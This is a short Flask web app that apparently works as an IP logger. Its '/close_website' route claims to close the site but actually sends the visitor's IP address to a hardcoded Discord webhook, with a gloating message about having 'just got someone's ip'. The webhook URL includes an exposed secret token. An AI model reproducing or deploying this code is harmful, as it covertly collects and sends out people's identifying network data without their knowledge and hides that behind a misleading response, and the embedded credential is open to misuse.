from flask import Flask, render_template, jsonify, request
import requests

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

import requests
import json

def send_discord_webhook(url, content):
    data = {"content": content}
    headers = {"Content-Type": "application/json"}

    response = requests.post(url, data=json.dumps(data), headers=headers)
    if response.status_code != 204:
        print(f"Failed to send Discord webhook. Error: {response.text}")
    else:
        print("Discord webhook sent successfully!")

webhook_url = 'https://discord.com/api/webhooks/1108099763208986674/BciHWR10lxw5nA_NgJapkiYxA3sWn_bxMCg4hDlTP4TbQiq9l-0zrAnlb8HOF2qDhoN3'




@app.route('/get_ip')
def get_ip():
    response = requests.get("https://api.ipify.org?format=json")
    data = response.json()
    ip_address = data['ip']
    return jsonify({'ip': ip_address})

@app.route('/close_website', methods=['POST'])
def close_website():
    ip_address = request.json['ip']
    message_content = f"Bro bro i just got someone's ip lmao\n{ip_address}"
    send_discord_webhook(webhook_url, message_content)
    return jsonify({'message': 'Website closed'})

if __name__ == '__main__':
    app.run()
